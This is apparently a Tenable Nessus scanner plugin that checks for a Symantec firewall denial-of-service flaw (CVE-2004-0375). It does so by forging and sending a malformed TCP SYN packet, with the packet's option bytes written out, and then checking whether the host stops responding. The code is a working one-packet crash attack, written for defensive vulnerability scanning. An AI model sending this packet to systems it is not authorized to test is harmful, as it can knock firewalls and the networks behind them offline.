#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(12216);
  script_version("$Revision: 1.21 $");
  script_cvs_date("$Date: 2014/05/26 16:32:07 $");

  script_cve_id("CVE-2004-0375");
  script_bugtraq_id(10204);
  script_osvdb_id(5596);

  script_name(english:"Symantec Firewall Malformed TCP Packet Options Remote DoS");
  script_summary(english:"Check for TCP options bug on the remote host");

  script_set_attribute(attribute:"synopsis", value:"The remote host is affected by a denial of service vulnerability.");
  script_set_attribute(attribute:"description", value:
"The remote system appears vulnerable to an invalid Options field
within a TCP packet. At least one vendor firewall (Symantec) has been
reported prone to such a bug. An attacker, utilizing this flaw, would
be able to remotely shut down the remote firewall (stopping all
network-based transactions) by sending a single packet to any port.");
  script_set_attribute(attribute:"see_also", value:"http://research.eeye.com/html/advisories/published/AD20040423.html");
  script_set_attribute(attribute:"solution", value:"Apply vendor-supplied patches.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:U/RL:U/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"No known exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"false");

  script_set_attribute(attribute:"vuln_publication_date", value:"2004/04/20");
  script_set_attribute(attribute:"patch_publication_date", value:"2004/04/20");
  script_set_attribute(attribute:"plugin_publication_date", value:"2004/04/26");

  script_set_attribute(attribute:"potential_vulnerability", value:"true");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_end_attributes();

  script_category(ACT_KILL_HOST);
  script_family(english:"Firewalls");
  script_copyright(english:"This script is (C) 2004-2014 Tenable Network Security, Inc.");

  script_require_keys("Settings/ParanoidReport");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");

if (report_paranoia < 2) audit(AUDIT_PARANOID);

if ( TARGET_IS_IPV6 ) exit(0);
#
# The script code starts here


# get an open port and name it port
port = get_host_open_port();
if (!port || port == 139 || port == 445 ) exit(0);
soc = open_sock_tcp(port);
if ( ! soc ) exit(0);
close(soc);
rport = (rand() % 50000) + 1024;
dstaddr=get_host_ip();
srcaddr=this_host();


# goofy packet which looks like:
# Sample Packet (as reported by eeye):
# 40 00 57 4B 00 00 01 01 05 00
# |___| |___| |___| |_________|
#   |     |     |        |
#  |     |     |    TCP Options
#  |     |  Urgent Pointer
#  |  Checksum
# Window Size


ip2 = forge_ip_packet(   ip_v : 4,
                        ip_hl : 5,
                        ip_tos : 0,
                        ip_len : 20,
                        ip_id : 0xABA,
                        ip_p : IPPROTO_TCP,
                        ip_ttl : 255,
                        ip_off : 0,
                        ip_src : srcaddr);

tcpip = forge_tcp_packet(    ip       : ip2,
                             th_sport : rport,
                             th_dport : rport,
                             th_flags : TH_SYN,
                             th_seq   : 0xABBA,
                             th_ack   : 0,
                             th_x2    : 0,
                             th_off   : 6,
                             th_win   : 512,
                             th_urp   : 0,
                             data     : raw_string(0x01,0x01,0x05,0x00) );

result = send_packet(tcpip,pcap_active:FALSE);

for (i = 0; i < 3; i ++)
{
 sleep(1);
 soc = open_sock_tcp(port);
 if (soc) { close(soc); exit(0); }
}

security_hole(port);
set_kb_item(name:"Host/dead", value:TRUE);

